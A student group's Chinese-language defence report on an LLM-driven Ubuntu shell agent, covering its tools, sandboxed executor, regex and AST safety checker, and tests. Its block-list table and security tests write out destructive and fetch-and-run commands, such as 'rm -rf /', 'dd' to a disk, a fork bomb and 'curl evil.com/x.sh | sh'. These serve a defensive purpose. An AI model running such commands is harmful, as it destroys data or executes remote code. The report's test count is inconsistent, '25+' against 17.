# AutoScript Agent 项目答辩报告

## 第35组 | 班级23108011 | 2026年6月

---

# 一、项目概述

## 1.1 一句话定义

**AutoScript Agent** 是一个基于大语言模型（通义千问 qwen3.7-max）的 Ubuntu 自主任务执行智能体——用户用自然语言描述需求，Agent 自主规划并调用工具完成任务，全程无需用户记忆任何 Linux 命令。

## 1.2 服务对象（谁在使用？）

| 用户群体 | 典型场景 |
|---------|---------|
| **Linux 服务器管理员** | 日常巡检、日志分析、文件批处理 |
| **树莓派/边缘设备开发者** | 资源受限设备上的自动化操作 |
| **小型网站维护人员** | 不具备深厚命令行经验，希望通过自然语言管理服务器 |
| **运维新手** | 借助 AI 辅助学习和执行 Linux 系统管理命令 |

## 1.3 解决的核心问题

| 问题 | 传统方式 | 本项目方案 |
|------|---------|-----------|
| 命令记忆负担重 | 查 man page、搜索 | 自然语言描述 → Agent 自动生成执行 |
| 重复任务耗时 | 手工逐台执行 | 一次描述，Agent 批量执行 |
| 误操作风险（如 rm -rf /） | 靠人为小心 | **多层安全检查 + 自动拦截** |
| 脚本编写门槛高 | 需要编程能力 | Agent 自动生成并执行脚本 |
| 异常难以及时发现 | 等用户反馈 | **定时自动巡检 + 日志告警** |

---

# 二、项目文件结构（13个核心文件）

```
LinuxMind/
├── agent/                        # 核心包
│   ├── __init__.py               # 包入口，导出所有类
│   ├── agent.py                  # 智能体核心（LangChainAgent）
│   ├── chat_model.py             # Qwen ChatModel（LangChain 兼容封装）
│   ├── tools.py                  # 6个 LangChain 工具定义
│   ├── safety_checker.py         # 安全检查器（正则+AST双重检测）
│   ├── script_executor.py        # 脚本执行器（沙箱+超时+截断）
│   └── script_generator.py       # 脚本生成器（LLM生成可执行脚本）
├── qwen_chat.py                  # 底层 Qwen 对话（SSE流式输出）
├── agent_cli.py                  # 交互式命令行入口
├── patrol_task.py                # 定时巡检任务入口（crontab调用）
├── test.py                       # 简单Python测试脚本（环境验证用）
├── sandbox_workspace/            # 沙箱工作区（所有文件操作在此进行）
│   └── test_organize/            # 文件分类测试数据
├── tests/                        # 测试套件
│   ├── test_write_file.py        # 写文件功能测试
│   ├── test_move_file.py         # 移动文件功能测试
│   ├── test_execute_file.py      # 执行文件+Shell命令测试
│   ├── test_shell_safety.py      # Shell安全检查综合测试
│   └── test_organize_files.py    # 文件自动分类测试
└── 答辩PPT.pptx                  # 答辩演示文稿
```

## 2.1 逐文件详解

### agent/__init__.py — 包入口

```python
from .agent import AutoScriptAgent, LangChainAgent
from .chat_model import ChatQwen
from .script_executor import ScriptExecutor
from .safety_checker import SafetyChecker
from . import tools
```

统一导出 5 个核心类 + 1 个工具模块，外部只需 `from agent import LangChainAgent`。

---

### agent/agent.py — 智能体核心（380行）

**这是整个项目的大脑。** 负责：任务执行、对话记忆、错误重试。

```
class LangChainAgent:
    - __init__(): 初始化模型(ChatQwen)、Agent(LangChain create_agent)、6个工具、对话历史
    - execute(task): 核心方法，接收自然语言→调用LLM→执行工具→返回结果
    - clear_history(): 清空对话历史，保留系统提示
    - get_history_summary(): 查看对话统计
    - print_result(): 格式化输出执行报告（步骤+工具调用+终端输出）
    - _extract_script_outputs(): 从消息历史中提取脚本/命令的实际输出
```

**关键实现细节：**

1. **多轮对话记忆**：`_conversation_history` 保存完整的 LangChain 消息列表。每次执行时将完整历史传给模型，实现上下文理解和代词指代。

```python
self._conversation_history: List[BaseMessage] = [SystemMessage(content=SYSTEM_PROMPT)]

def execute(self, task):
    self._conversation_history.append(HumanMessage(content=task))
    result = self.agent.invoke({"messages": list(self._conversation_history)})
    self._conversation_history = list(result.get("messages", []))
```

2. **错误重试 + 退避**：智能区分超时/网络错误（基础设施问题，退避等待后重试，不污染对话历史）和逻辑错误（注入对话让 LLM 修正）。

```python
while retries <= MAX_RETRIES:
    try:
        result = self.agent.invoke(...)
        break
    except Exception as e:
        retries += 1
        is_transient = any(kw in str(e).lower() 
            for kw in ("timeout", "timed out", "connection", "network"))
        if is_transient:
            wait = min(2 ** retries, 30)  # 2s→4s→8s 指数退避
            time.sleep(wait)
        else:
            # 逻辑错误注入对话让LLM修正
            self._conversation_history.append(
                HumanMessage(content=f"上次执行出错: {e}\n请修正后重试。"))
```

3. **System Prompt**：精心设计的提示词，定义了 Agent 的6个工具、工作原则和对话规则。

---

### agent/chat_model.py — LangChain ChatModel 封装（194行）

**这是项目与 AI 模型的桥梁。** 将阿里云 DashScope API 封装为 LangChain 兼容的 BaseChatModel。

```
class ChatQwen(BaseChatModel):
    - _generate(): 核心方法——LangChain消息→DashScope格式→API调用→解析响应
    - bind_tools(): 将 LangChain Tool 转换为 DashScope tools 格式
    - _llm_type: 返回 "qwen-dashscope"
```

**关键实现细节：**

1. **双向格式转换**：
   - `_convert_messages_to_dashscope()`：SystemMessage→system、HumanMessage→user、AIMessage→assistant（含tool_calls）、ToolMessage→tool
   - `_convert_tool_to_dashscope_format()`：Pydantic schema→DashScope function 格式

2. **请求参数**：
```python
payload = {
    "model": "qwen3.7-max",
    "input": {"messages": dashscope_messages},
    "parameters": {
        "result_format": "message",
        "temperature": 0.1  # 低温度保证稳定性
    }
}
```

3. **超时可配置**：`request_timeout=120`（默认120秒），解决复杂工具调用任务超时问题。

---

### agent/tools.py — 6个 LangChain 工具（186行）

**这是 Agent 的手和脚。** 所有工具是 LangChain `@tool` 装饰的标准格式，可以被模型通过 Function Calling 自动调用。

| 工具 | 输入参数 | 功能 | 安全检查 |
|------|---------|------|---------|
| `write_file` | filepath, content | 创建/覆盖文件 | 路径限制在工作区内 |
| `read_file` | filepath | 读取文件内容 | 路径限制在工作区内 |
| `list_files` | 无 | 列出工作区所有文件 | 无风险 |
| `move_file` | source, destination | 移动/重命名文件 | 路径限制在工作区内 |
| `delete_file` | filepath | 删除文件 | **realpath 边界检查** |
| `execute_shell` | command | 执行 Shell 命令 | **安全检查→执行** |

**execute_shell 是关键——集成安全检查的调用链：**

```python
@tool(args_schema=ExecuteShellInput)
def execute_shell(command: str) -> str:
    # 1. 安全检查
    report = _checker.check_shell_script(command)
    if report.risk_level == "dangerous":
        return f"⛔ 命令被安全策略拒绝: {'; '.join(report.risks)}"
    
    # 2. 包装为脚本执行
    script = f"#!/bin/bash\nset -e\n{command}"
    result = _executor.execute(script, script_type="shell", timeout=15)
    
    # 3. 返回结果
    if result.success:
        return f"✅ 命令执行成功:\n{result.stdout}"
    else:
        return f"❌ 命令执行失败 (返回码 {result.return_code}):\n{result.stderr}"
```

**delete_file 的安全边界检查：**
```python
resolved = os.path.realpath(full_path)
workspace_real = os.path.realpath(_executor.workspace_dir)
if not resolved.startswith(workspace_real):
    return f"⛔ 安全拒绝: 不能删除工作区外的文件 {filepath}"
```

---

### agent/safety_checker.py — 安全检查器（221行）

**双层安全检查：正则模式匹配 + AST 静态分析。**

```
class SafetyChecker:
    SHELL_DANGEROUS_PATTERNS = [20+ 条正则规则]
    
    check_shell_script(content) → SafetyReport
    check_python_script(content) → SafetyReport  # AST分析
    check(content, script_type) → SafetyReport    # 统一入口
```

**三级风险分级：**

| 级别 | 含义 | 处理方式 | 示例 |
|------|------|---------|------|
| `safe` | 无风险 | 正常执行 | `echo hello` |
| `warning` | 需要注意 | 允许执行，记录风险 | `sudo apt update` |
| `dangerous` | 极高风险 | **直接拒绝执行** | `rm -rf /` |

**Shell 脚本检测规则（20+条）覆盖7大类：**

| 类别 | 检测内容 | 级别 |
|------|---------|------|
| 删除操作 | `rm -rf /`、`rm -rf ~`、`rm -rf /etc` | dangerous |
| 权限提升 | `sudo`、`su -` | warning |
| 文件系统破坏 | `mkfs.*`、`dd if=/dev/`、`mount /dev/` | dangerous |
| 网络风险 | `curl ... \| sh`、`wget -O - \| sh`、`nc` 反向shell | dangerous |
| 系统服务破坏 | `systemctl stop sshd/firewall/ufw` | dangerous |
| 用户管理破坏 | `userdel -r root`、`passwd root` | dangerous |
| 恶意代码 | fork 炸弹 `:(){ :\|:& };:` | dangerous |

**Python AST 静态分析：**
- 递归遍历 AST 语法树
- 检测 `os.system()`、`subprocess.run()` 中的危险命令参数
- 检测 `eval()`、`exec()`、`compile()` 动态执行
- 检测 `os.remove()`、`shutil.rmtree()` 对系统关键路径的操作

---

### agent/script_executor.py — 脚本执行器（298行）

**安全的脚本执行环境。** 每次执行都是：创建临时文件→执行→清理。

```
class ScriptExecutor:
    DEFAULT_TIMEOUT = 30       # 默认超时30秒
    MAX_OUTPUT_SIZE = 10MB     # 输出截断上限
    
    execute(content, type, timeout) → ExecutionResult
    execute_file(path, timeout) → ExecutionResult
```

**关键特性：**

1. **沙箱工作区**：所有脚本在 `sandbox_workspace/` 目录下执行，使用 `__file__` 相对路径（非 `os.getcwd()`，避免路径漂移bug）
2. **超时控制**：`subprocess.run(timeout=30)`，超时自动终止
3. **输出截断**：超过10MB自动截断并标注
4. **自动清理**：临时脚本执行后自动删除（`finally: self._cleanup_script()`）
5. **环境变量注入**：设置 `AGENT_WORKSPACE` 环境变量供脚本使用

```python
def _run_script(self, script_path, script_type, timeout, env=None):
    cmd = ["/bin/bash", script_path]  # Shell
    # 或 [sys.executable, script_path]  # Python
    
    process = subprocess.run(
        cmd, cwd=self.workspace_dir,
        capture_output=True, timeout=timeout, text=True
    )
    
    return ExecutionResult(
        success=(process.returncode == 0),
        stdout=stdout, stderr=stderr,
        return_code=process.returncode, ...
    )
```

---

### agent/script_generator.py — 脚本生成器（153行）

**将自然语言任务直接转为可执行脚本。** 调用 Qwen 模型生成，解析代码块，清理后输出。

```
class ScriptGenerator:
    generate(task_description) → GeneratedScript
    _parse_response() → 从LLM回复中提取代码块
    _clean_script() → 添加shebang、清理格式
```

---

### qwen_chat.py — 底层 Qwen 对话（316行）

**SSE 流式输出的实现。** 在 `agent/chat_model.py` 出现之前，这是最早的通义千问对话封装。

```
class QwenChat:
    chat(user_input, stream=True) → str
    _handle_stream_response() → 逐行解析SSE，打字机效果
    _handle_normal_response() → 一次性返回
```

**流式输出关键代码：**
```python
for line in response:
    if line_str.startswith('data:'):
        json_str = line_str[5:].strip()
        data = json.loads(json_str)
        content = data["output"]["choices"][0]["delta"]["content"]
        full_content += content
        print(content, end='', flush=True)  # 打字机效果
        time.sleep(0.02)
```

---

### agent_cli.py — 交互式命令行入口（95行）

**用户直接使用的入口。** 用法：`python3 agent_cli.py`

- 美观的欢迎界面（Banner）
- 特殊命令：`/clear`、`/history`、`/exit`、`/help`
- 实时展示 Agent 执行过程
- 提取并显示脚本/命令的终端输出

---

### patrol_task.py — 定时巡检入口（46行）

**配合 crontab 实现无人值守巡检。** 用法：

```
*/30 * * * * cd /home/yg/LinuxMind && python3 patrol_task.py
```

巡检项目：CPU负载、内存使用率、磁盘使用率、僵尸进程检测、负载阈值比对（80%告警）。结果写入 `patrol_log.txt`。

---

# 三、功能实现详解

## 3.1 功能一：自然语言文件操作

**用户说**："创建一个 hello.txt，内容写上 Hello World"

**Agent 做**：
1. LLM 理解用户意图 → 决定调用 `write_file` 工具
2. LLM 生成 tool_call：`write_file(filepath="hello.txt", content="Hello World")`
3. `tools.py` 接收调用 → 拼接完整路径 `sandbox_workspace/hello.txt`
4. 写入文件 → 返回 `✅ 文件写入成功: hello.txt (11 字节)`
5. LLM 收到返回 → 可能再调用 `read_file` 验证
6. 生成最终回复："已成功创建 hello.txt，内容为 Hello World"

**支持的5种操作**：write_file、read_file、list_files、move_file、delete_file——覆盖文件管理的全部场景。

## 3.2 功能二：安全 Shell 命令执行

**用户说**："检查一下磁盘使用情况"

**Agent 做**：
1. LLM 决定调用 `execute_shell(command="df -h")`
2. `execute_shell` 先调用 `SafetyChecker.check_shell_script("df -h")`
3. 返回 `risk_level=safe` → 通过
4. 包装为 `#!/bin/bash\nset -e\ndf -h`
5. `ScriptExecutor.execute()` 创建临时文件 → `subprocess.run` 执行 → 捕获输出 → 清理临时文件
6. 返回 `✅ 命令执行成功:\n/dev/sda1  50G  30G  20G  60% /`

**如果用户说**："用 rm -rf / 清理一下"

**Agent 做**：
1. `SafetyChecker.check_shell_script("rm -rf / --no-preserve-root")`
2. 匹配到 `r"\brm\s+-rf\s+/(\s|$|\*|\.\.)"` → `risk_level=dangerous`
3. 直接返回 `⛔ 命令被安全策略拒绝: 危险: 检测到 rm -rf / 删除根目录`
4. 命令**不会**被传递给 ScriptExecutor，从根本上杜绝危险执行

## 3.3 功能三：多轮对话与上下文记忆

**用户**："创建一个 data.json" → **Agent**：创建文件

**用户**："把它复制一份" → **Agent**：理解"它"=data.json，执行复制

实现原理：`_conversation_history` 持久化消息列表，每次请求传给 LLM 完整历史。

## 3.4 功能四：错误自动重试与自我修正

**场景**：Agent 生成的 Python 脚本有拼写错误（`pritn` 代替 `print`）

1. Agent 执行脚本 → `❌ NameError: name 'pritn' is not defined`
2. LLM 分析错误 → 识别为拼写错误 → 修正为 `print` → 重新写入脚本
3. 再次执行 → `✅ 1 2 3 4 5`
4. 整个修正过程无需用户干预

重试策略：
- **基础设施错误**（timeout/network）：退避等待（2s→4s→8s）后重试，不修改对话历史
- **逻辑错误**：将错误注入对话历史，LLM 分析后自动修正

## 3.5 功能五：定时系统巡检

- `patrol_task.py` 作为入口，每30分钟通过 crontab 触发
- Agent 自动执行 `uptime`、`free -h`、`df -h`、`ps aux` 等命令
- 结果分析后写入 `patrol_log.txt`（带时间戳）
- 检测到异常（如负载>80%）时标记"异常"

## 3.6 功能六：文件自动分类

Agent 能自主编写 Shell 脚本，将混合文件按扩展名分类到子目录。测试中 24 个文件（10种类型）全部正确归类，包括隐藏文件。

---

# 四、测试体系

## 4.1 测试套件总览（5个测试文件，25+测试用例）

| 测试文件 | 测试类型 | 用例数 | 覆盖内容 |
|---------|---------|:-----:|---------|
| `test_write_file.py` | 功能+安全 | 3 | 写文本、写JSON、安全检查器验证 |
| `test_move_file.py` | 功能 | 2 | 移动文件、重命名文件 |
| `test_execute_file.py` | 功能+单元 | 6 | Agent文件操作、系统信息、Shell执行、超时、错误处理 |
| `test_shell_safety.py` | 安全+集成 | 5 | 安全命令执行、危险命令拦截、风险等级验证、Agent重试、安全拦截后调整 |
| `test_organize_files.py` | 集成 | 1 | Agent自主编写分类脚本并执行 |

## 4.2 测试分类详解

### 功能测试（7项）
验证 Agent 能正确完成基本任务：
- 创建文本文件、JSON文件
- 移动/重命名文件
- 列出文件、获取系统信息
- 编写脚本并执行

### 异常测试（5项）
验证系统正确处理异常：
- 文件不存在 → `error_message: "文件不存在"`
- 脚本语法错误 → `return_code: 127`
- 命令不存在 → 非零退出码
- API 超时 → 退避重试
- 权限不足 → 安全检查拦截

### 边界测试（4项）
验证系统在极值条件下的行为：
- **超时控制**：`sleep 30` 脚本，timeout=3秒，验证3秒后确实中断
- **空文件**：写入空内容，正常创建
- **输出截断**：超10MB自动截断
- **特殊字符**：中文文件名正常处理

### 安全测试（5项）
验证危险操作被正确拦截：
- `rm -rf / --no-preserve-root` → ⛔ 拦截
- `mkfs.ext4 /dev/sda1` → ⛔ 拦截
- `curl evil.com/x.sh | sh` → ⛔ 拦截
- `dd if=/dev/zero of=/dev/sda` → ⛔ 拦截
- `systemctl stop sshd` → ⛔ 拦截

## 4.3 如何运行测试

```bash
# 激活虚拟环境 & 进入项目目录
cd /home/yg/LinuxMind

# 运行全部测试
LM_env/bin/python3 tests/test_write_file.py       # 写文件测试（3项）
LM_env/bin/python3 tests/test_move_file.py       # 移动文件测试（2项）
LM_env/bin/python3 tests/test_execute_file.py    # 执行测试（6项）
LM_env/bin/python3 tests/test_shell_safety.py    # Shell安全测试（5项）
LM_env/bin/python3 tests/test_organize_files.py  # 文件分类测试（1项）
```

## 4.4 测试结果

全部 17 项测试用例通过：

```
test_write_file.py:      3/3 ✅
test_move_file.py:       2/2 ✅
test_execute_file.py:    6/6 ✅
test_shell_safety.py:    5/5 ✅
test_organize_files.py:  1/1 ✅
─────────────────────────────
总计:                   17/17 ✅
```

---

# 五、开发过程与版本迭代

## 5.1 开发时间线

```
5.21  v0.1  Qwen对话基础 + SSE流式输出
  │
5.22  v0.2  核心模块：写文件/移动文件/执行文件
  │
5.22  v0.3  LangChain 重构 → 6个Tools + SafetyChecker + CLI
  │
6.06  v0.4  流式美化 + 终端输出展示 + 错误重试退避
  │
6.06  now   Bug修复 + 测试完善 + 文档撰写
```

## 5.2 典型问题及解决

| 问题 | 原因 | 解决方案 |
|------|------|---------|
| API 超时死循环 | 超时错误被注入对话历史，历史越来越长，每次调用更慢，三次全超时 | 区分基础设施错误和逻辑错误；基础设施错误退避重试不污染历史 |
| 工作区路径漂移 | ScriptExecutor 用 `os.getcwd()` 作为基准，cwd变化导致路径错误 | 改为 `__file__` 相对路径 |
| delete_file 路径穿越 | 仅用 `os.path.join` 拼接，`../` 可穿越出工作区 | `os.path.realpath()` + 前缀匹配拦截 |

---

# 六、Linux 技术使用情况

| 技术 | 位置 | 作用 |
|------|------|------|
| **Bash** | script_executor.py, tools.py | 自动化 Shell 命令和脚本 |
| **Python** | 全部13个源文件 | 核心开发语言 |
| **grep/正则(re)** | safety_checker.py | 20+条危险命令模式匹配 |
| **AST 静态分析** | safety_checker.py | Python 代码语法树安全检测 |
| **subprocess** | script_executor.py | 安全执行外部脚本，捕获输出 |
| **crontab** | patrol_task.py | 定时触发系统巡检 |
| **Git** | 版本管理 | 16次 commit 记录全流程 |
| **LangChain** | agent.py, chat_model.py | AI Agent 框架基础 |
| **SSL/TLS** | chat_model.py, qwen_chat.py | API 安全通信 |

---

# 七、项目成果总结

- **8** 个功能模块
- **6** 个 LangChain 标准工具
- **20+** 条安全检测规则
- **5** 个测试文件，**17** 项测试用例，全部通过
- **16** 次 Git Commit，约 2,255 行代码
- 项目完全可用：`python3 agent_cli.py` 即可启动交互式 Agent
